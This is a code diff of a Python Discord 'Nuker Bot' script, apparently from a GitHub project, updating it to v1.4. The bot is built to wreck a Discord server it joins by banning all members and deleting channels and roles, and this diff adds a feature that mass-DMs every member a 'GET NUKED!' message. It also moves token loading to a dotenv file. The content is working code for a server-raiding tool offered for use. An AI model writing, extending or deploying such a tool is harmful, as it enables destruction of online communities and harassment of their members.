@@ -1,18 +1,24 @@
 # Made by KingWaffleIII
 
 # Nuker Bot
-# v1.4-alpha
+# v1.4
 
 import discord
 from discord.ext import commands
 from datetime import datetime
-from os import chdir
+from dotenv import load_dotenv
+from os import getenv
 from time import sleep
 from typing import Optional
 
 # var declarations
 
-TOKEN = ""
+try:
+    load_dotenv()
+    TOKEN = getenv("TOKEN")
+except Exception:
+    TOKEN = ""
+
 prefix = "!"
 
 intents = discord.Intents.default()
@@ -23,7 +29,6 @@ bot = commands.Bot(command_prefix=prefix, intents=intents)
 
 bot.remove_command("help")
 
-bot_id = 813383774137614436
 
 admin_role = [False]
 
@@ -34,6 +39,7 @@ config_options = {
     3 : "roles",
     4 : "server",
     5 : "nuke_channel",
+    6 : "dm"
 }
 
 ban = [True] # banning config in !skip
@@ -41,6 +47,7 @@ channels = [True] # channel deletion config in !skip
 roles = [True] # roles config in !skip
 server = [True] # server config in !skip
 nuke_channel = [True] # nuke_channel config in !skip
+dm = [True] # dm config in !skip
 
 
 # nuking functions
@@ -330,9 +337,10 @@ async def nuke(ctx):
     for member in ctx.guild.members:
         member_list.append(member.id)
 
-    member_list.remove(bot_id) # remove the bot from the "to be banned" list
+    member_list.remove(bot.user.id) # remove the bot from the "to be banned" list
     member_list.remove(ctx.message.author.id) # remove the user from the "to be banned" list
-    member_list.remove(ctx.guild.owner_id) # remove the server owner from the "to be banned" list
+    if ctx.message.author.id != ctx.guild.owner.id:
+        member_list.remove(ctx.guild.owner_id) # remove the server owner from the "to be banned" list
 
     await ban_members(ctx, member_list)
 
@@ -417,7 +425,7 @@ Time: {datetime.now()}
 @bot.command(name="volume")
 async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optional[str]):
     await ctx.message.delete()
-    global ban, channels, roles, server, nuke_channel
+    global ban, channels, roles, server, nuke_channel, dm
 
     if value != "*":
         setting = config_options[int(value)]
@@ -461,6 +469,17 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
                 nuke_channel.append("get nuked")
 
             print(f"Changed nuke channel to {nuke_channel[0]} with a name of {nuke_channel[1]}")
+
+        elif setting == "dm":
+            dm = []
+            dm.append(status)
+
+            if arg1:
+                dm.append(arg1)
+            else:
+                dm.append("GET NUKED!")
+
+            print(f"Changed DM everyone to {dm[0]} with a message of {dm[1]}")
     
     else:
         ban = []
@@ -503,6 +522,17 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
 
         print(f"Changed nuke channel to {nuke_channel[0]} with a name of {nuke_channel[1]}")
 
+        dm = []
+        dm.append(status)
+
+        if arg1:
+            dm.append(arg1)
+        else:
+            dm.append("GET NUKED!")
+
+        print(f"Changed DM everyone to {dm[0]} with a message of \"{dm[1]}\"")
+
+
 
 # customisable nuke command introduced in v1.4
 @bot.command(name="skip")
@@ -512,18 +542,40 @@ async def skip(ctx):
     do_roles = roles[0]
     do_server = server[0]
     do_nc = nuke_channel[0]
+    do_dm = dm[0]
 
     # check for custom nuke_channel
     if do_nc:
         nc_name = nuke_channel[1]
         await create_nuke_channel(ctx, nc_name)
 
+    if do_dm:
+        message = dm[1]
+        dm_list = []
+        for member in ctx.guild.members:
+            dm_list.append(member)
+
+        dm_list.remove(bot.user) # remove the bot from the "to DM" list
+        dm_list.remove(ctx.message.author) # remove the user from the "to DM" list
+        if ctx.message.author.id != ctx.guild.owner.id:
+            dm_list.remove(ctx.guild.owner) # remove the server owner from the "to DM" list
+
+        for member in dm_list:
+            try:
+                if not member.bot:
+                        await member.send(message)
+                else:
+                    print(f"Could not DM user {member.name}: user is a bot.")
+            except discord.HTTPException:
+                print(f"Could not DM user {member.name}.")
+
+
     if do_ban:
         member_list = []
         for member in ctx.guild.members:
             member_list.append(member.id)
 
-        member_list.remove(bot_id) # remove the bot from the "to be banned" list
+        member_list.remove(bot.user.id) # remove the bot from the "to be banned" list
         member_list.remove(ctx.message.author.id) # remove the user from the "to be banned" list
         member_list.remove(ctx.guild.owner_id) # remove the server owner from the "to be banned" list
 
@@ -659,12 +711,16 @@ Server Owner: {ctx.guild.owner}
 Time: {datetime.now()}
 ''')
 
-print("\nPlease enter your bot token: ")
-print("(if you don't know what this is, please visit: https://github.com/KingWaffleIII/Nuker-Bot#setup to see how to make your own bot application)\n")
-TOKEN = input("> ")
-try:
-    bot.run(str(TOKEN))
-except discord.LoginFailure:
-    print("Unable to log into the bot; please verify the bot token is correct!")
-except KeyboardInterrupt:
-    print("Quitting... press CTRL+C again to kill the app.")
+if TOKEN == "":
+    print("Not detecting a dotenv file...")
+    print("\nPlease enter your bot token: ")
+    print("(if you don't know what this is, please visit: https://github.com/KingWaffleIII/Nuker-Bot#setup to see how to make your own bot application)\n")
+    TOKEN = input("> ")
+    try:
+        bot.run(str(TOKEN))
+    except discord.LoginFailure:
+        print("Unable to log into the bot; please verify the bot token is correct!")
+    except KeyboardInterrupt:
+        print("Quitting... press CTRL+C again to kill the app.")
+else:
+    bot.run(TOKEN)
